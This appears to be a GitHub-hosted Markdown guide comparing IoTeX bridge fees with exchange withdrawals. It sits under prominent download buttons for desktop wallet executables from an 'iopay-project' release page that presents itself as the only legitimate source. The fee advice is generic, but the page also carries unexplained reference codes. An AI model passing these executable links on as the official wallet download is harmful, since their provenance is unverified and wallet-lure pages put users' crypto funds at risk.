![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Bridge Fees vs Exchange Transfers: What Actually Costs Less

There is no single answer, and any page that gives one is guessing about amounts, routes and the day you read it. What can be answered is **how to compare**, which takes three numbers on each side and about two minutes.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

## What a bridge transfer costs (Q048)

Three components, not one:

1. **The bridge's fee** - the route's charge, shown in the quote (F023).
2. **Source-chain gas** - what the chain charges to submit the transfer.
3. **Destination-chain gas** - needed to complete the delivery. Easy to forget, and the reason a "cheap" bridge can still fail: you fund the second one before you start.

The wallet shows a fee comparison against doing the same transfer through an exchange (F023, F034), which is exactly the comparison this page is about - use the number on screen rather than a figure from an article.

## What an exchange transfer costs

- **Withdrawal fee** - charged by the venue, varies by network.
- **Spread** - the difference between what you paid for the asset and what the venue's rate gives you, if you buy and withdraw in one go.
- **Time** - deposits, confirmations, and the occasional hold for review.
- **Availability** - the venue may not support the network you need, or may not list the asset at all.

That last one is not a cost, but it decides the question more often than fees do.

## The comparison that actually holds

| Situation | Usually fewer steps | Why |
|---|---|---|
| You already hold the asset on the source chain | Bridge | No venue account, no deposit |
| The venue supports the exact network | Exchange withdrawal | One fee, no second gas cost |
| Small amount | Exchange withdrawal, often | Fixed bridge fees hurt small transfers |
| Large amount, asset already on-chain | Bridge, often | Percentage-based venue fees scale up |
| Time-critical | Whichever is faster that day | Bridges depend on source finality; venues on review queues |

Those are tendencies, not rules. Amount and route flip them.

## The cost nobody prices

**A failed bridge costs more than a fee.** If you bridge with destination gas unfunded, you spend the source fee and wait. If you bridge the wrong variant - ERC-20 IOTX expecting native ([the variants](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/bridging-iotx-from-ethereum-to-iopay.md)) - you have moved an asset that will not do the job you needed. Those mistakes cost more than the difference between two fee tables.

So the order is: **correct variant, correct address form, gas on both sides, then price.** Optimising fees before those four is optimising the wrong thing.

## How to run the comparison

1. **Get the bridge quote** in the wallet, and read the fee, not just the rate.
2. **Check destination gas** - what will it cost you to fund the receiving account?
3. **Get the venue's withdrawal fee** for the same asset and network.
4. **Add the venue's spread** if you would be buying there first.
5. **Compare totals, not percentages**, and include the value of your time if the venue route has a review step.

## FAQ

**What does the IoTeX bridge cost?**
The route fee shown in the quote, plus gas on the source chain, plus gas on the destination chain to complete. No fixed figure is quoted here.

**Is bridging cheaper than sending through an exchange?**
It depends on the amount, the route and the venue's current fee. The method above is the answer; a flat "yes" would be wrong half the time.

**Why does the bridge need gas on both chains?**
Because delivery is a second transaction on the destination chain ([how the bridge works](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-use-the-iotube-bridge-in-iopay-wallet.md)).

**Are there wallet fees on top?**
No wallet fee is stated by the project; [fees explained](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-fees-explained.md).

**Can I avoid the second gas cost?**
Only by keeping a small IOTX balance on IoTeX in advance - which is cheaper than funding it under time pressure.

## Timing, finality and the queue nobody sees

Both routes wait, and they wait for different reasons. A bridge completes when the source transaction is final and the delivery transaction on the destination chain is included; until both happen, the asset is in transit rather than in either wallet. An exchange withdrawal waits for the venue's confirmation threshold, and sometimes for a review step that has no published duration.

Neither delay is a fee, but both change the comparison when the transfer is time-sensitive. A route that costs less and takes an hour is not cheaper than one that costs more and lands in minutes if the reason you are moving is a position you need to open today.

## A worksheet instead of a verdict

Fill this in with the two live quotes and the answer stops being an argument:

| Line | Bridge | Exchange |
|---|---|---|
| Route or withdrawal fee | from the quote | from the venue's fee page |
| Source-chain gas | from the review screen | included in the withdrawal fee, usually |
| Destination-chain gas | your own estimate | none - the venue delivers |
| Spread or price impact | route quote | only if you buy there first |
| Time to spendable | bridge plus delivery | confirmations plus any review |
| **Total** | **sum of the first four** | **sum of the first four** |

The row most often left blank is destination gas, and it is the one that turns a bridge into a stuck transfer. Fund it before you start, not after the source transaction is already mined.

## When neither route is the right one

If the amount is small, the asset is available on a venue that supports the exact network, and you already have an account there, the venue usually wins - one fee, no second gas, no variant question. If the amount is large and the asset is already on-chain, the percentage-based venue costs start to dominate and the bridge usually wins.

And if the transfer is not urgent at all, the cheapest option is often neither: wait until you actually need the asset on the other side. A bridge fee you did not pay is the only fee that is definitely zero.

## The return trip

A comparison of one direction is half a comparison. Assets that arrive on IoTeX may need to go back later, and the return costs its own route fee and its own gas on each side, at whatever the rates are then. A bridge that is cheap inbound can be expensive outbound.

If the plan is a short stay - bridging in to stake for a term and bridging out afterwards - price the round trip rather than the entry, and keep enough of the destination asset to pay for the exit when the time comes.

## Reading a quote as three lines

A bridge quote is easier to act on when it is read as three lines rather than one total. The route's own fee sits in the quote; the source-chain gas is on the review screen; the destination gas is yours to fund. Only the first appears in the number the panel puts in front of you, which is why a transfer can look cheap and then stall for want of a second balance.

The wallet also shows a comparison against an exchange transfer for the same move (F023). That comparison is the right starting point, because it is built from the quote you are about to accept rather than from a table in an article, and it includes the fee the route charges on the day you look.

---

*Cost components follow the bridge's behaviour (F023, F034) and IoTeX chain mechanics (F030). No fee amounts are stated.*
